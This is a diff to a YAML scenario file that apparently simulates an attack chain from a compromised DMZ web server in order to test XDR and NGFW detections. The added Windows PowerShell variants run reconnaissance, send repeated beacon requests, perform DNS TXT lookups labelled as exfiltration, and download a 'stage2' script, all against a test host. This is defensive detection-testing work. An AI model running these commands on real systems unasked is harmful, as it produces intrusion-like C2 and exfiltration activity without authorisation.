@@ -76,6 +76,18 @@ required_planes_in_incident:
   - NDR
 stitching_key: src_host
 
+# ── Causality contract ──────────────────────────────────────────────────────
+# The DMZ web server (apache2, running as www-data) is the Causality Group
+# Owner: the initial-access process that spawns the interactive shell, which in
+# turn forks the curl beacon, the dig DNS-tunnel loop and the second-stage curl
+# download. Modeling apache2→bash→{curl,dig,curl} as a CONNECTED process_lineage
+# tree (instead of a star off the synthetic beacon) is what lets XSIAM tie the
+# XDR process leg to the NGFW session leg on the shared src_host and fold both
+# planes into ONE incident (the F2 Causality-Chain-Completeness thesis).
+cgo_anchor:
+  image_name: "apache2"
+  primary_username: "www-data"
+
 external_tools:
   - name: Sliver
     source: "https://github.com/BishopFox/sliver"
@@ -96,6 +108,9 @@ steps:
       echo '[*] This command produces a BIOC on XDR for "shell spawned from www-data"'
     identity: www-data
     mitre_technique: "T1059.004"
+    platforms: ["linux", "windows"]
+    platform_variants:
+      windows: "powershell.exe -Command \"whoami; hostname; systeminfo | Select-Object -First 3\""
     expected_detections:
       - plane: EDR
         type: BIOC
@@ -115,6 +130,12 @@ steps:
       echo '[*] NGFW should flag repetitive beaconing pattern from DMZ endpoint'
     identity: www-data
     mitre_technique: "T1071.001"
+    platforms: ["linux", "windows"]
+    platform_variants:
+      windows: "for ($i=1; $i -le 5; $i++) { Invoke-WebRequest -UseBasicParsing -UserAgent 'Mozilla/5.0 (compatible; CortexSimBeacon/1.0)' -Uri \"http://testmynids.org/uid/index.html?beacon=$i\" | Out-Null; Start-Sleep 12 }"
+    causality:
+      parent_step: step-01
+      pivot: process_lineage
     expected_detections:
       - plane: NDR
         type: XQL
@@ -165,6 +186,12 @@ steps:
       echo '[*] NGFW DNS analytics should flag anomalous TXT volume with high-entropy labels'
     identity: www-data
     mitre_technique: "T1572"
+    platforms: ["linux", "windows"]
+    platform_variants:
+      windows: "1..20 | ForEach-Object { Resolve-DnsName -Type TXT \"exfil-$_.testmynids.org\" -Server 1.1.1.1 -ErrorAction SilentlyContinue | Out-Null; Start-Sleep 1 }"
+    causality:
+      parent_step: step-01
+      pivot: process_lineage
     expected_detections:
       - plane: NDR
         type: XQL
@@ -191,6 +218,12 @@ steps:
       echo '[*] Not executed - just staged for BIOC detection'
     identity: www-data
     mitre_technique: "T1105"
+    platforms: ["linux", "windows"]
+    platform_variants:
+      windows: "Invoke-WebRequest -UseBasicParsing -Uri http://testmynids.org/uid/index.html -OutFile $env:TEMP\\cortexsim_stage2.ps1"
+    causality:
+      parent_step: step-01
+      pivot: process_lineage
     expected_detections:
       - plane: NDR
         type: XQL
